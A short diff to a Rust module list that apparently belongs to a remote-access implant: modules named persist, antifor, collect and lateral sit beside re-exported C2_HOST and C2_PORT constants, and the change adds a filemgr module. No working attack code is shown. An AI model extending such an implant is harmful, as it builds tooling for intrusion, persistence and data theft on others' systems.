@@ -17,6 +17,7 @@ mod persist;
 mod antifor;
 mod collect;
 mod lateral;
+mod filemgr;
 mod agent_loop;
 
 pub use agent_loop::{Session, C2_HOST, C2_PORT, BUILD_UUID};
